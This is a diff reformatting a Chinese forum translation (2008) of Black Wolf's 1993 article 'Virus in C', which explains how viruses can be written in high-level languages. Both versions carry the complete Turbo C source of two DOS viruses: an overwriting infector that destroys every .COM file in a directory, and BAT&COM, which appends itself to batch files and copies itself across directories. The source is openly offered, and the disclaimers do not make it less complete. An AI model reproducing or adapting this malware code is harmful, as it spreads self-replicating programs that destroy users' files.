@@ -1,217 +1,229 @@
 
-
 # 【翻译】用 C 编写病毒（比较老的文章）
 
 > 原文：[`www.pediy.com/kssd/pediy10/66465.html`](https://www.pediy.com/kssd/pediy10/66465.html)
 
-用 C 编病毒  
-标 题: 【翻译】用 C 编写病毒（比较老的文章）  
-作 者: 我本寂寞  
-时 间: 2008-06-13，01：34  
-链 接: http://bbs.pediy.com/showthread.php?p=466096  
-  
-原文链接：[`vx.netlux.org/lib/vbw06.html`](http://vx.netlux.org/lib/vbw06.html)  
-今晚搜到一篇老的文件（而且还是 DOS 环境下的，![](img/e71d9210a215d5b66755d038631e0c83.jpg "恐怖!")），Virus in C，没翻译过文章，于是就有点手痒痒了，于是就有了如下译文，本人初次翻译，定有很多不当的地方，还望众高手指点。虽然，本作者指明了：\[DO NOT RELEASE!\]，但费了好些劲才翻译完不帖出来分享下子心中不快，也就希望原作者别。。。![](img/e71d9210a215d5b66755d038631e0c83.jpg "恐怖!")  
-  
-译文如下：  
-  
-高级语言，如 BASIC，C 和很多其它的语言，是如今许多程序员的选择（晕，第一句话就难到我了，原文为：“Upper-level languages, such as Basic, C, and a multitude of others, are where most programmers these days feel at home”，本人水平如此，众高手莫笑）。它们为开发人员提供了惊人的大量的内置函数，并让程序员们可以安心的编程而不用理会他们所用的机器，然而让程序员们把更多的精力花在程序设计上。对于编写病毒来说，这使他们可以用自己最喜爱的语言编写，但是这会带来很多的弊端。第一点，许多高级语言的编程不是基于底层系统层次，即使是 C 也不太容易。这就导致这类的大都数病毒的繁殖机制很原始（通常是通过重写来实现），即使它们的触发机制会很高明。另一很重要的不足是，大多用高级语言编写的病毒至少有 10K，然而更多是比这还更大，这对病毒来说可行不通。因此，如此的一个常驻内存的病毒将是不切实际的，因为当一大块内存不明不白的消失时，这很容易引起用户的注意。  
-  
-另一种用高级语言编写病毒的可能性是代码病毒（source-code virus）。这类病毒极其罕见（最少在我的水平之内是这样），但是这类病毒是非常高效的。代码病毒的机制，简而言之，搜索同一类语言的代码文件，比如说，它可能会搜找全部以“.C”为扩展名的 C 文件，然后它会把自己的加到那个文件里（通常以添加一个包含此程序的头文件然后在 main()函数中添加一个调用），这使病毒在编译这文件时至少执行一次。编译之后，病毒一般会隐藏在这程序里，会一直潜伏着，直到找到另一个 C 文件。关于此类病毒的文献我只知道一编：Mark Ludwig 写的 virus presented in Computer Virus Developments Quarterly, Volume 1, Number 2.  
-  
-不管病毒采用哪种方式，所有的病毒都具有如下一些共同的基本特性：  
-  1.搜寻一个文件进行感染，这文件可以是可执行文件，源代码文件，或是什么都行（若没找到，则跳转到第三步）  
-  2.把病毒本体写入此文件  
-  3.检查有没可满足的触发条件，若有，这病毒激活  
-  4.返回宿主程序或是停止运行并返回到 DOS.  
-  
-对于重写型病毒（Overwriting Virus），它的实现方式很简单。唯一的不足是，它们会摧毁被感染的文件，这使它们很容易被发现。唯一弥补的办法是，找到所有的被感染的文件并删除它们，然后从备件那里恢复。下面这个病毒是用 C 写的比较简单的重写型病毒，它会感染当前目录下的所有.COM 文件，然后把它们彻底删除。每当它感觉到一个文件，它会在屏幕上打印出“Infecting \[FILENAME\]”（感染 \[文件名\]）警告。如果你想把它编译并测试，则首先编译它，然后用 EXE2BIN 把它转化成.BIN 文件，之后检查它的最终大小。如果不等于 9504K，则改写这行：“x=9054;”成适当的大小。它会以一种很原始的方式：删除所有的它命中.COM 文件，因此得相当小心这病毒。  
-  
-代码:
+## 元数据
+
+- **标题**: 【翻译】用 C 编写病毒（比较老的文章）
+- **作者**: 我本寂寞
+- **时间**: 2008-06-13，01：34
+- **链接**: [`http://bbs.pediy.com/showthread.php?p=466096`](http://bbs.pediy.com/showthread.php?p=466096)
+- **原文链接**: [`vx.netlux.org/lib/vbw06.html`](http://vx.netlux.org/lib/vbw06.html)
+
+## 前言
+
+今晚搜到一篇老的文件（而且还是 DOS 环境下的，![](img/e71d9210a215d5b66755d038631e0c83.jpg "恐怖!")），`Virus in C`，没翻译过文章，于是就有点手痒痒了，于是就有了如下译文，本人初次翻译，定有很多不当的地方，还望众高手指点。虽然，本作者指明了：`[DO NOT RELEASE!]`，但费了好些劲才翻译完不帖出来分享下子心中不快，也就希望原作者别。。。![](img/e71d9210a215d5b66755d038631e0c83.jpg "恐怖!")
+
+## 译文如下
+
+### 1. 高级语言与病毒
+
+高级语言，如 `BASIC`、`C` 和很多其它的语言，是如今许多程序员的选择（晕，第一句话就难到我了，原文为：“`Upper-level languages, such as Basic, C, and a multitude of others, are where most programmers these days feel at home`”，本人水平如此，众高手莫笑）。它们为开发人员提供了惊人的大量的内置函数，并让程序员们可以安心的编程而不用理会他们所用的机器，然而让程序员们把更多的精力花在程序设计上。对于编写病毒来说，这使他们可以用自己最喜爱的语言编写，但是这会带来很多的弊端。
+
+第一点，许多高级语言的编程不是基于底层系统层次，即使是 `C` 也不太容易。这就导致这类的大都数病毒的繁殖机制很原始（通常是通过重写来实现），即使它们的触发机制会很高明。另一很重要的不足是，大多用高级语言编写的病毒至少有 `10K`，然而更多是比这还更大，这对病毒来说可行不通。因此，如此的一个常驻内存的病毒将是不切实际的，因为当一大块内存不明不白的消失时，这很容易引起用户的注意。
+
+另一种用高级语言编写病毒的可能性是代码病毒（`source-code virus`）。这类病毒极其罕见（最少在我的水平之内是这样），但是这类病毒是非常高效的。代码病毒的机制，简而言之，搜索同一类语言的代码文件，比如说，它可能会搜找全部以 `.C` 为扩展名的 `C` 文件，然后它会把自己的加到那个文件里（通常以添加一个包含此程序的头文件然后在 `main()` 函数中添加一个调用），这使病毒在编译这文件时至少执行一次。编译之后，病毒一般会隐藏在这程序里，会一直潜伏着，直到找到另一个 `C` 文件。关于此类病毒的文献我只知道一编：`Mark Ludwig` 写的 `virus presented in Computer Virus Developments Quarterly, Volume 1, Number 2`。
+
+### 2. 病毒的基本特性
+
+不管病毒采用哪种方式，所有的病毒都具有如下一些共同的基本特性：
+
+1. 搜寻一个文件进行感染，这文件可以是可执行文件，源代码文件，或是什么都行（若没找到，则跳转到第三步）
+2. 把病毒本体写入此文件
+3. 检查有没可满足的触发条件，若有，这病毒激活
+4. 返回宿主程序或是停止运行并返回到 `DOS`。
+
+### 3. 重写型病毒
+
+对于重写型病毒（`Overwriting Virus`），它的实现方式很简单。唯一的不足是，它们会摧毁被感染的文件，这使它们很容易被发现。唯一弥补的办法是，找到所有的被感染的文件并删除它们，然后从备件那里恢复。
+
+下面这个病毒是用 `C` 写的比较简单的重写型病毒，它会感染当前目录下的所有 `.COM` 文件，然后把它们彻底删除。每当它感觉到一个文件，它会在屏幕上打印出 `Infecting [FILENAME]`（感染 [文件名]）警告。如果你想把它编译并测试，则首先编译它，然后用 `EXE2BIN` 把它转化成 `.BIN` 文件，之后检查它的最终大小。如果不等于 `9504K`，则改写这行：`x=9054;` 成适当的大小。它会以一种很原始的方式：删除所有的它命中 `.COM` 文件，因此得相当小心这病毒。
+
+```c
+    - - ------------------ Cut Here -------------------------- - -
+    /\* This is a simple overwriting virus programmed in Turbo C \*/
+    /\*  It will infect all .COM files in the current directory  \*/
+    /\*    Infections destroy the programs and cannot be cured   \*/
+    /\*   It was presented in Virology 101 (c) 1993 Black Wolf   \*/
+    /\*     FOR EDUCATIONAL PURPOSES ONLY, DO NOT RELEASE!       \*/
+
+    #include <stdio.h>
+    #include <dos.h>
+    #include <dir.h>
+
+    FILE *Virus,*Host;
+    int x,y,done;
+    char buff[256];
+    struct ffblk ffblk;
+
+    main()
+    {
+     done = findfirst("*.COM",&ffblk,0);   /\* Find a .COM file \*/
+       while (!done)          /\* Loop for all COM's in DIR\*/
+        {
+        printf("Infecting  %s\n", ffblk.ff_name);    /\* Inform user \*/
+        Virus=fopen(_argv[0],"rb");          /\* Open infected file  \*/
+        Host=fopen(ffblk.ff_name,"rb+");     /\* Open new host file  \*/
+
+        x=9504;                             /\* Virus size - must   \*/
+                                            /\* be correct for the  \*/
+                                            /\* compiler it is made \*/
+                                            /\* on, otherwise the   \*/
+                                            /\* entire virus may not\*/
+                                            /\* be copied!!         \*/
+        while (x>256)                       /\* OVERWRITE new Host  \*/
+            {                               /\* Read/Write 256 byte \*/
+            fread(buff,256,1,Virus);        /\* chunks until bytes  \*/
+            fwrite(buff,256,1,Host);        /\* left < 256          \*/
+            x-=256;
+            }
+        fread(buff,x,1,Virus);             /\* Finish off copy     \*/
+        fwrite(buff,x,1,Host);
+        fcloseall();                       /\* Close both files and\*/
+        done = findnext(&ffblk);           /\* go for another one. \*/
+        }
+                                           /\* Activation would go \*/
+                                           /\* here                \*/
+      return (0);                         /\* Terminate           \*/
+    }
+    - - ------------------ Cut Here --------------------------- - -
+```
+
+### 4. BAT&COM 病毒
+
+下面要介绍的病毒也是用 `C` 编写的，但它和上面所讲的病毒在功能上有很大的不同。它不是感染可执行文件并重写它们，而是感染指定目录的 `.BAT` 文件。当 `BAT&COM` 执行的时候，它首先会在当前目录的下一个目录搜寻批处理文件(`Batch file`)。如果没有找到任何的 `BAT` 文件，它会试着在根目录里找，最后会试着在 `DOS` 目录下找。如果它找到了，它会感染此目录下的所有批处理文件，然后检查这文件已经被感染。如果没有，就生成一个包含病毒，名叫 `BAT&COM` 的文件。在我的设置里，用 `EXE2BIN` 转换之后，最终大小约为 `10K`。这病毒代码如下：
+
+`The BAT&COM Virus in C`
+
+
 
 ```
-    - - ------------------ Cut Here -------------------------- - -
-    /\* This is a simple overwriting virus programmed in Turbo C \*/
-    /\*  It will infect all .COM files in the current directory  \*/
-    /\*    Infections destroy the programs and cannot be cured   \*/
-    /\*   It was presented in Virology 101 (c) 1993 Black Wolf   \*/
-    /\*     FOR EDUCATIONAL PURPOSES ONLY, DO NOT RELEASE!       \*/
+    - - - -----------------Start Code------------------------- - - -
+    /*  This file is a high-level language virus of a different sort.
+        It will search out batch files and, when found, place a copy
+        of itself in the directory with the batch file while adding
+        instructions in the BAT to execute this new file.  In this way,
+        it will spread each time an "infected" batch is run.
+        Disinfection is done simply by deleting all of the BAT&COM.COM
+        files and removing the commands from batch files that ruin
+        them.  This one is NOT confined to the current directory,
+        so make sure it is on an isolated machine and be sure to
+        clean up any infections. PLEASE DO NOT RELEASE!
 
-    #include <stdio.h>
-    #include <dos.h>
-    #include <dir.h>
-
-    FILE \*Virus,\*Host;
-    int x,y,done;
-    char buff\[256\];
-    struct ffblk ffblk;
-
-    main()
-    {
-     done = findfirst("\*.COM",&ffblk,0);   /\* Find a .COM file \*/
-       while (!done)               /\* Loop for all COM's in DIR\*/
-        {
-        printf("Infecting  %s\\n", ffblk.ff\_name);    /\* Inform user \*/
-        Virus=fopen(\_argv\[0\],"rb");          /\* Open infected file  \*/
-        Host=fopen(ffblk.ff\_name,"rb+");     /\* Open new host file  \*/
-
-        x=9504;                               /\* Virus size - must   \*/
-                                              /\* be correct for the  \*/
-                                              /\* compiler it is made \*/
-                                              /\* on, otherwise the   \*/
-                                              /\* entire virus may not\*/
-                                              /\* be copied!!         \*/
-        while (x>256)                         /\* OVERWRITE new Host  \*/
-            {                                 /\* Read/Write 256 byte \*/
-            fread(buff,256,1,Virus);          /\* chunks until bytes  \*/
-            fwrite(buff,256,1,Host);          /\* left < 256          \*/
-            x-=256;
-            }
-        fread(buff,x,1,Virus);                /\* Finish off copy     \*/
-        fwrite(buff,x,1,Host);
-        fcloseall();                          /\* Close both files and\*/
-        done = findnext(&ffblk);              /\* go for another one. \*/
-        }
-                                              /\* Activation would go \*/
-                                              /\* here                \*/
-      return (0);                             /\* Terminate           \*/
-    }
-    - - ------------------ Cut Here --------------------------- - -
-
-```
-
-下面要介绍的病毒也是用 C 编写的，但它和上面所讲的病毒在功能上有很大的不同。它不是感染可执行文件并重写它们，而是感染指定目录的.BAT 文件。当 BAT&COM 执行的时候，它首先会在当前目录的下一个目录搜寻批处理文件(Batch file)。如果没有找到任何的 BAT 文件，它会试着在根目录里找，最后会试着在 DOS 目录下找。如果它找到了，它会感染此目录下的所有批处理文件，然后检查这文件已经被感染。如果没有，就生成一个包含病毒，名叫 BAT&COM 的文件。在我的设置里，用 EXE2BIN 转换之后，最终大小约为 10K。这病毒代码如下：  
-  
-The BAT&COM Virus in C  
-代码:
-
-```
-    - - - -----------------Start Code------------------------- - - -
-    /\*  This file is a high-level language virus of a different sort.
-        It will search out batch files and, when found, place a copy
-        of itself in the directory with the batch file while adding
-        instructions in the BAT to execute this new file.  In this way,
-        it will spread each time an "infected" batch is run.
-        Disinfection is done simply by deleting all of the BAT&COM.COM
-        files and removing the commands from batch files that ruin
-        them.  This one is NOT confined to the current directory,
-        so make sure it is on an isolated machine and be sure to
-        clean up any infections. PLEASE DO NOT RELEASE!
-
-        BAT&COM virus is (C) 1993 Black Wolf Enterprises.
-    \*/
+        BAT&COM virus is (C) 1993 Black Wolf Enterprises.
+    */
 
 
-    #include <stdio.h>
-    #include <dos.h>
-    #include <dir.h>
-    #include <string.h>
+    #include <stdio.h>
+    #include <dos.h>
+    #include <dir.h>
+    #include <string.h>
 
-            struct ffblk ffblk;
-    main()
-    {
-         char old\_dir\[MAXPATH\];
-         Get\_Path(old\_dir);            /\* Save the old directory  \*/
-         Pick\_A\_Dir();                 /\* Find a new directory to \*/
-         Infect\_Directory();           /\* infect and infect it.   \*/
-         chdir(old\_dir);               /\* Return to old directory \*/
-         return 0;
-    }
+            struct ffblk ffblk;
+    main()
+    {
+         char old_dir[MAXPATH];
+         Get_Path(old_dir);            /* Save the old directory  */
+         Pick_A_Dir();                 /* Find a new directory to */
+         Infect_Directory();           /* infect and infect it.   */
+         chdir(old_dir);              /* Return to old directory */
+         return 0;
+    }
 
 
 
-    Pick\_A\_Dir()
-    {
-         int done;
-         chdir("..");                      /\* First, Go out a DIR. \*/
-         done=findfirst("\*.BAT",&ffblk,0); /\* If no BAT files, try \*/
-                                           /\* root and DOS         \*/
-         if (done)
-                {
-                chdir("\\\\");
-                done=findfirst("\*.BAT",&ffblk,0);
-                if (done) chdir("\\\\DOS\\\\");
-                }
-    return 0;
-    }
+    Pick_A_Dir()
+    {
+         int done;
+         chdir("..");                   /* First, Go out a DIR. */
+         done=findfirst("*.BAT",&ffblk,0); /* If no BAT files, try */
+                                           /* root and DOS         */
+         if (done)
+                {
+                chdir("\\");
+                done=findfirst("*.BAT",&ffblk,0);
+                if (done) chdir("\\DOS\\");
+                }
+    return 0;
+    }
 
 
-    Infect\_Directory()
-    {
-         int done;
+    Infect_Directory()
+    {
+         int done;
 
-         done = findfirst("\*.BAT",&ffblk,0);
-         while (!done)                       /\* Find all .BAT files \*/
-            {                                /\* and add code to run \*/
-             Do\_Batch();                     /\* BAT&COM if not      \*/
-             done = findnext(&ffblk);        /\* already there       \*/
-            }
+         done = findfirst("*.BAT",&ffblk,0);
+         while (!done)                  /* Find all .BAT files */
+            {                            /* and add code to run */
+             Do_Batch();                 /* BAT&COM if not      */
+             done = findnext(&ffblk);    /* already there       */
+            }
 
-         if (findfirst("BAT&COM.COM",&ffblk,0)) /\* If BAT&COM does  \*/
-            {Copy\_Virus();}                     /\* not exist, then  \*/
-         return 0;                              /\* copy it into dir.\*/
-    }
-
-
-
-    Do\_Batch()
-    {
-            FILE \*batch;
-            char Infection\_Buffer\[12\];
-            char vpath\[MAXPATH\];
-
-            Get\_Path(vpath);            /\* Get path for adding path \*/
-                                        /\* specifier in commands    \*/
+         if (findfirst("BAT&COM.COM",&ffblk,0)) /* If BAT&COM does  */
+            {Copy_Virus();}                    /* not exist, then  */
+         return 0;                        /* copy it into dir.*/
+    }
 
 
-            if (vpath\[3\]==0) vpath\[2\]=0; /\* Keep path good in root  \*/
 
-            batch=fopen(ffblk.ff\_name, "rt+");
-            fseek(batch, -11, SEEK\_END);
-            fread(Infection\_Buffer,11,1,batch);
-            Infection\_Buffer\[11\]=0;             /\* Terminate String \*/
+    Do_Batch()
+    {
+            FILE *batch;
+            char Infection_Buffer[12];
+            char vpath[MAXPATH];
 
-            if (strcmp(Infection\_Buffer,"BAT&COM.COM")) /\* Check if \*/
-                    {                                   /\* Batch is \*/
-                    fseek(batch, 0, SEEK\_END);          /\* infected.\*/
-                    fprintf(batch,"\\n%s\\\\BAT&COM.COM",vpath);
-                    }                              /\*^- Add command \*/
-                                                   /\*   to batch    \*/
-
-            fclose(batch);
-            return 0;
-    }
+            Get_Path(vpath);            /* Get path for adding path */
+                                        /* specifier in commands    */
 
 
-    Copy\_Virus()
-    {
-         FILE \*old\_virus, \*new\_virus;
-         int write\_length;
-         char copy\_buffer\[1024\];              /\* Copy the virus to \*/
-                                              /\* new directory     \*/
-         old\_virus=fopen(\_argv\[0\],"rb");
-         new\_virus=fopen("BAT&COM.COM","wb");
+            if (vpath[3]==0) vpath[2]=0; /* Keep path good in root  */
 
-         write\_length=1024;
+            batch=fopen(ffblk.ff_name, "rt+");
+            fseek(batch, -11, SEEK_END);
+            fread(Infection_Buffer,11,1,batch);
+            Infection_Buffer[11]=0;             /* Terminate String */
 
-         while (write\_length==1024)
-            {
-            write\_length=fread(copy\_buffer,1,1024,old\_virus);
-            fwrite(copy\_buffer,write\_length,1,new\_virus);
-            }
-         fclose(old\_virus);
-         fclose(new\_virus);
-         return 0;
-    }
+            if (strcmp(Infection_Buffer,"BAT&COM.COM")) /* Check if */
+                {                                   /* Batch is   */
+                fseek(batch, 0, SEEK_END);          /* infected.*/
+                fprintf(batch,"\\n%s\\BAT&COM.COM",vpath);
+                }                         /*^- Add command */
+                                          /*   to batch     */
+
+            fclose(batch);
+            return 0;
+    }
 
 
-    Get\_Path(char \*path)
-    {
-            strcpy(path, "A:\\\\");
-            path\[0\] ='A' + getdisk();    /\* Returns current path \*/
-            getcurdir(0, path+3);
-            return 0;
-    }
-    - - - -----------------End of Code------------------------ - - -
+    Copy_Virus()
+    {
+         FILE *old_virus, *new_virus;
+         int write_length;
+         char copy_buffer[1024];               /* Copy the virus to */
+                                          /* new directory     */
+         old_virus=fopen(_argv[0],"rb");
+         new_virus=fopen("BAT&COM.COM","wb");
 
+         write_length=1024;
+
+         while (write_length==1024)
+            {
+            write_length=fread(copy_buffer,1,1024,old_virus);
+            fwrite(copy_buffer,write_length,1,new_virus);
+            }
+         fclose(old_virus);
+         fclose(new_virus);
+         return 0;
+    }
+
+
+    Get_Path(char *path)
+    {
+            strcpy(path, "A:\\");
+            path[0] = 'A' + getdisk();    /* Returns current path */
+            getcurdir(0, path+3);
+            return 0;
+    }
+    - - - -----------------End of Code------------------------ - - -
 ```
